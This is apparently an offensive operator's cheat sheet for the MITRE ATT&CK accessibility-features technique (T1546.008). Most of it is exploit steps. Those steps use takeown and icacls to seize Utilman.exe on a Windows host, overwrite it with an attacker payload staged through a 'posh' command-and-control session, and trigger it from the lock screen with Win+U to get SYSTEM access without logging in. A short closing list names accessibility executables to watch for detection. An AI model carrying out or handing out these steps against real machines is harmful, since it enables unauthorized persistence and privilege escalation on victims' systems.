# [Accessibility Features](https://attack.mitre.org/techniques/T1546/008/)

## Exploit syntax:

1. Get a beacon with administrative privileges. 

2. Put a payload on the victim box if it's not already present.

3. In parrot open a blank text file and paste the following commands into it and choose either to move or copy the payload on the third line then set the \<payload path> to the payload location on the victim box
    ```sh
    takeown /f c:\windows\system32\Utilman.exe /A;
	icacls c:\windows\system32\Utilman.exe /grant administrators:F;
	<move/copy> <payload path> c:\windows\system32\Utilman.exe;
    ```
4. Save the file with as NoobNoob.ps1 to /tmp
5. Run
	```sh
	sudo chmod +x /tmp/NoobNoob.ps1
	```

6.  In posh, run
    ```sh
	pslo /tmp/NoobNoob.ps1
    ```
7. From the login lockscreen of the windows box, press the windows key and 'U'
and the payload will execute. No login is required. Should give you System privileges. 

### This will not give you an administrator prompt

## Detection Technique:

* Observe common Windows Accessibility Features executables
	* sethc.exe 
	* Utilman.exe
	* osk.exe
	* Narrator.exe
	* Magnify.exe